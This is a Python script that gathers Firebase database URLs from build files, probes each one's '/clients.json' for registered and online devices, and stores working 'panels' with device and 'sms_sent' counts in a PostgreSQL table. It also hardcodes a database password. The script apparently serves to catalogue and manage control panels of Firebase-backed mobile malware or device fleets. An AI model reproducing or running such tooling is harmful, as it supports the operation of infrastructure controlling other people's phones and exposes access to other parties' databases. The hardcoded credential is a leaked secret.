﻿import zipfile
import re
import psycopg2
import httpx
import asyncio
import time
import uuid

# 1. Read all files from builds directory to collect all original firebase URLs
urls = set()
import glob
for fpath in glob.glob("/app/data/builds/**/*.py", recursive=True) + glob.glob("/app/data/builds/**/*.bak", recursive=True) + glob.glob("/app/data/workspace/*.py"):
    try:
        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
            c = f.read()
        found = re.findall(r'https://[a-zA-Z0-9_\.\-]+(?:firebaseio\.com|firebasedatabase\.app)[^\s"\'\)\,\}]*', c)
        for u in found:
            urls.add(u.strip())
    except Exception:
        pass

print("Total distinct Firebase URLs discovered across all files:", len(urls))

conn = psycopg2.connect(
    host="cowbox-db-khaat-pg",
    port=5432,
    dbname="aat",
    user="postgres",
    password="c2fc05f1e013adefcf7c627c"
)
cur = conn.cursor()
cur.execute("SELECT url FROM databases")
current_in_db = set(r[0] for r in cur.fetchall())
print("Currently in DB:", len(current_in_db))

urls_to_test = list(urls)
print("URLs to test:", len(urls_to_test))

async def probe_url(client, url, sem):
    base = url.rstrip("/")
    cb = int(time.time() * 1000)
    if "?" in base:
        base_clean, query = base.split("?", 1)
        clients_url = base_clean + "/clients.json?" + query + "&_cb=" + str(cb)
    else:
        clients_url = base + "/clients.json?_cb=" + str(cb)
        
    async with sem:
        for attempt in range(2):
            try:
                r = await client.get(clients_url, timeout=httpx.Timeout(6.0, connect=4.0))
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, dict) and len(data) > 0:
                        online = 0
                        now_ms = time.time() * 1000
                        for cid, cdata in data.items():
                            if isinstance(cdata, dict):
                                raw_status = cdata.get("status")
                                raw_seen = (cdata.get("lastSeen") or cdata.get("last_seen") or cdata.get("timestamp"))
                                ts = None
                                if raw_seen:
                                    try:
                                        ts = float(raw_seen)
                                        if ts < 1e12: ts = ts * 1000
                                    except Exception:
                                        pass
                                if bool(raw_status) and (ts is None or (now_ms - ts < 86400000)):
                                    online += 1
                        return {"url": url, "devices": len(data), "online": online, "valid": True}
            except Exception:
                pass
        return {"url": url, "devices": 0, "online": 0, "valid": False}

async def main():
    sem = asyncio.Semaphore(40)
    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        tasks = [probe_url(client, u, sem) for u in urls_to_test]
        results = await asyncio.gather(*tasks)

    valid_panels = [r for r in results if r["valid"]]
    print("Found valid working panels with registered devices:", len(valid_panels))
    
    # Insert / update valid panels into PostgreSQL
    for item in valid_panels:
        u = item["url"]
        name = u.split("//")[1].split(".")[0]
        did = str(uuid.uuid4())
        try:
            cur.execute(
                "INSERT INTO databases (id, url, name, added, status, sms_sent, devices_online) VALUES (%s, %s, %s, %s, 'active', 0, %s) ON CONFLICT (url) DO UPDATE SET status = 'active', devices_online = %s",
                (did, u, name, "2026-09-17", item["online"], item["online"])
            )
        except Exception as e:
            pass
    conn.commit()

    cur.execute("SELECT count(*) FROM databases WHERE status = 'active'")
    total_active = cur.fetchone()[0]
    print("Total active working panels now in PostgreSQL databases table:", total_active)
    
    cur.close()
    conn.close()

asyncio.run(main())
